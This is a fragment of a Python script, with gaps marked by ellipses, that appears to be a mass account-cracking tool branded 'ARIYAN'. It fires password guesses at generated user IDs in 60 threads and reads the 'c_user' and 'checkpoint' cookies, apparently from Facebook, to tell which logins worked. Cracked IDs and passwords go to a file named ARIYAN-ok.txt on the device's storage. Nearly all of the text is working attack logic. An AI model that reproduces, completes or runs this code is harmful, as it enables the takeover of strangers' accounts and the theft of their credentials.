...
def Main():
	...
	for nmbr in range(limit):
		...
		user.append(nmp)
	with tred(max_workers=60) as ARIYAN:
		os.system('clear')
		print(logo)
		tl = str(len(user))
...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mARIYAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[ARIYAN-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/ARIYAN-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[ARIYAN-CP] {uid} ¤ {ps}")
